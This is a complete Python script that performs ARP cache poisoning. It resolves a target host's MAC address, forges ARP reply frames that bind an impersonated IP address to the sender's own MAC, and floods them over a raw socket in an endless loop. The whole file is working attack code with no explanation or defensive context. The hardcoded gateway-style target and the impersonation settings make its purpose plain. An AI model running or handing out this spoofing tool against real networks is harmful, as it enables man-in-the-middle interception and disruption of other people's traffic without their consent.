#!/usr/bin/python3

from uuid import getnode as get_mac
from struct import pack
from socket import socket, AF_PACKET, AF_INET, SOCK_RAW, SOCK_DGRAM, PACKET_BROADCAST
import sys


#<config
INTERFACE = 'wlp3s0'
IMPERSONATED_HOST_IP = '192.168.1.120'
POISONED_HOST_IP = '192.168.1.1'
#>


ONE_BYTE = '!B'
TWO_BYTES = '!H'


def fill_arp_cache_with(ip):
    echo_port = 80
    timeout = 10
    with socket(AF_INET, SOCK_DGRAM) as s:
        s.sendto(b'\x00', (ip, echo_port))


def read_mac_from_arp_cache(ip):
    result = 0
    while result == 0:
        with open('/proc/net/arp') as f:
            arps = f.read()
    
        line = [line for line in arps.split('\n') if ip in line][0]
        mac = line.split()[3]
        result = int(mac.replace(':', ''), 16)

    return result


def find_mac_by_ip(ip):
    fill_arp_cache_with(ip)
    mac = read_mac_from_arp_cache(ip)
    return mac


def split_ip(ip):
    nums = [int(i) for i in ip.split('.')]
    return (
        (nums[0] << 8) + nums[1],
        (nums[2] << 8) + nums[3],
    )


def split_mac(mac):
    return (
        (mac >> 4 * 8) & 0xffff,
        (mac >> 2 * 8) & 0xffff,
        (mac >> 0 * 8) & 0xffff,
    )


def create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac):
    hardware_type = 0x0001       # for ethernet
    protocol_type = 0x0800       # for ipv4
    hardware_address_len = 0x06  # for mac
    protocol_address_len = 0x04  # for ipv4
    operation = 0x0002           # for 'reply'
    sender_hardware_address = split_mac(sender_mac)
    sender_protocol_address = split_ip(sender_ip)
    target_hardware_address = split_mac(target_mac) # ignored for 'send'
    target_protocol_address = split_ip(target_ip)
    
    return b''.join([
        pack(TWO_BYTES, hardware_type),
        pack(TWO_BYTES, protocol_type),
        pack(ONE_BYTE, hardware_address_len),
        pack(ONE_BYTE, protocol_address_len),
        pack(TWO_BYTES, operation),

        pack(TWO_BYTES, sender_hardware_address[0]),
        pack(TWO_BYTES, sender_hardware_address[1]),
        pack(TWO_BYTES, sender_hardware_address[2]),

        pack(TWO_BYTES, sender_protocol_address[0]),
        pack(TWO_BYTES, sender_protocol_address[1]),

        pack(TWO_BYTES, target_hardware_address[0]),
        pack(TWO_BYTES, target_hardware_address[1]),
        pack(TWO_BYTES, target_hardware_address[2]),

        pack(TWO_BYTES, target_protocol_address[0]),
        pack(TWO_BYTES, target_protocol_address[1])
    ])


def create_eth_header(sender_mac, target_mac):
    destination = split_mac(target_mac)
    source = split_mac(sender_mac)
    ether_type = 0x0806 # arp EtherType
    return b''.join([
        pack(TWO_BYTES, destination[0]),
        pack(TWO_BYTES, destination[1]),
        pack(TWO_BYTES, destination[2]),

        pack(TWO_BYTES, source[0]),
        pack(TWO_BYTES, source[1]),
        pack(TWO_BYTES, source[2]),

        pack(TWO_BYTES, ether_type),
    ])


def create_arp_packet(sender_ip, target_ip, sender_mac, target_mac):
    return b''.join([
                     create_eth_header(sender_mac, target_mac),
                     create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac)]) 


def send(packet):
    with socket(AF_PACKET, SOCK_RAW) as s:
        s.bind((INTERFACE, 0))
        s.send(packet)


def main():
    poisoned_host_mac = find_mac_by_ip(POISONED_HOST_IP)
    impersonated_host_mac = get_mac()

    packet = create_arp_packet(sender_ip=IMPERSONATED_HOST_IP,
                               target_ip=POISONED_HOST_IP,
                               sender_mac=impersonated_host_mac,
                               target_mac=poisoned_host_mac)
    
    while True:
        send(packet)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\nDone.')
        sys.exit(0)

